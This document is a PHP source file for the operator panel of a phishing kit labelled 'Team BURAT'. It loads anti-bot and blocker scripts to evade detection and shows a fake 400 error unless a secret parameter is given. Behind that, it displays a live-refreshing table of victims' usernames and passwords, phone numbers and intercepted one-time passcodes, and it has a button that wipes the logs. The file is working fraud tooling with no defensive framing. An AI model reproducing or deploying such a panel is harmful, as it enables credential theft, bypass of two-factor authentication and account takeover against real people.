<?php
include("config/antibots.php");
include("config/blocker.php");
include("config/function.php");
include("config/antibotsulit.php");

if (!isset($_GET["credit"])) {
    header("HTTP/1.0 400 Bad Request");
    die("<html lang='en'><head><title>HTTP Status 400 – Bad Request</title><style type='text/css'>body {font-family: Tahoma, Arial, sans-serif;}h1,h2,h3,b{color: white;background-color: #525D76;}h1 {font-size: 22px;}h2{font-size: 16px;}h3 {font-size: 14px;}p {font-size: 12px;}a {color: black;}.line {height: 1px;background-color: #525D76;border: none;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1> </body></html>");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
    <link rel="stylesheet" href="./home_files/burat.css">
    <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$$$ Team BURAT $$$</title>
</head>
<body>
    <div id="header">
        <h2>Team BURAT</h1>

        <p>Visitors: <span id="visitors"></span></p>


        <form method="post">
            <input type="submit" value="clear logs" id="clear" name="delete" class="delete">
        </form>       


        </div>
        <table style="width:100%;" id="taybnle">
            <tr id="qweqwe">
                <th class="qweqwe">USERNAME & PASSWORD</th>
                <th class="qweqwe">NUMBER</th>
                <th class="qweqwe">OTP</th>
            </tr>
            <tr>
                <td class="pwe">
                    <div id="yos" class="left">

                    </div>
                </td>
                <td class="pwe">
                    <div id="yos1" class="center">

                    </div>
                </td>
                <td class="pwe">        
                    <div id="yos2" class="right">
                        
                    </div>
                </td>                
				<script>
				function copyToClipboard(id) {
					var from = document.getElementById(id);
					var range = document.createRange();
					window.getSelection().removeAllRanges();
					range.selectNode(from);
					window.getSelection().addRange(range);
					document.execCommand('copy');
					window.getSelection().removeAllRanges();
				}
				$(document).ready(function(){  
				setInterval(function(){ 
					$("#yos2").load("./otp.php?logmein");
				}, 1000);});

				$(document).ready(function(){  
				setInterval(function(){ 
					$("#yos1").load("./number.php?logmein");
				}, 1000);});

				$(document).ready(function(){  
				setInterval(function(){ 
					$("#yos").load("./logs.php?logmein");
				}, 1000);});
				$(document).ready(function(){ 
				setInterval(function(){
					$("#visitors").load("./visitors.php");
				}, 1000);});



				</script>
            </tr>
        </table>
</body>
<?php
if(isset($_POST['delete'])){
    
    $x = "
<?php
if(!isset(\$_GET[\"logmein\"])){
    header(\"HTTP/1.0 400 Bad Request\");
    die(\"<html lang='en'><head><title>HTTP Status 400 – Bad Request</title><style type='text/css'>body {font-family: Tahoma, Arial, sans-serif;}h1,h2,h3,b{color: white;background-color: #525D76;}h1 {font-size: 22px;}h2{font-size: 16px;}h3 {font-size: 14px;}p {font-size: 12px;}a {color: black;}.line {height: 1px;background-color: #525D76;border: none;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1> </body></html>\");  
    exit();
}?>
<style>
    #user{
        border-collapse: collapse;
    }
    #password{        
        border-left:1px solid #00FF00;
        border-collapse: collapse;
    }
    #datime{
        font-size:12px;
        vertical-align: none;
    }
</style>
<table style='width:100%;'>
";
    $y = "
<?php

if(!isset(\$_GET[\"logmein\"])){
    header(\"HTTP/1.0 400 Bad Request\");
    die(\"<html lang='en'><head><title>HTTP Status 400 – Bad Request</title><style type='text/css'>body {font-family: Tahoma, Arial, sans-serif;}h1,h2,h3,b{color: white;background-color: #525D76;}h1 {font-size: 22px;}h2{font-size: 16px;}h3 {font-size: 14px;}p {font-size: 12px;}a {color: black;}.line {height: 1px;background-color: #525D76;border: none;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1> </body></html>\");  
    exit();
}?>
<style>
    #number{
        border-left:1px solid #00FF00;
        border-collapse: collapse;
    }
</style>
<table style='width:100%;'>
";
    $z = "
<?php
if(!isset(\$_GET[\"logmein\"])){
    header(\"HTTP/1.0 400 Bad Request\");
    die(\"<html lang='en'><head><title>HTTP Status 400 – Bad Request</title><style type='text/css'>body {font-family: Tahoma, Arial, sans-serif;}h1,h2,h3,b{color: white;background-color: #525D76;}h1 {font-size: 22px;}h2{font-size: 16px;}h3 {font-size: 14px;}p {font-size: 12px;}a {color: black;}.line {height: 1px;background-color: #525D76;border: none;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1> </body></html>\");  
    exit();
}?>
<style>
    #otp{
        border-left:1px solid #00FF00;
        border-collapse: collapse;
    }
    td span{
        color:green;
    }
</style>
<table style='width:100%;'>
";
    file_put_contents("logs.php", "$x");
    file_put_contents("number.php", "$y");
    file_put_contents("otp.php", "$z");
    if (!empty($_POST) && $_SERVER['REQUEST_METHOD'] == 'POST') {
        $data = $_POST['delete'];
        unset($data);
    } else {
        exit;
    }
}else{
    exit;
}
?>
</html>
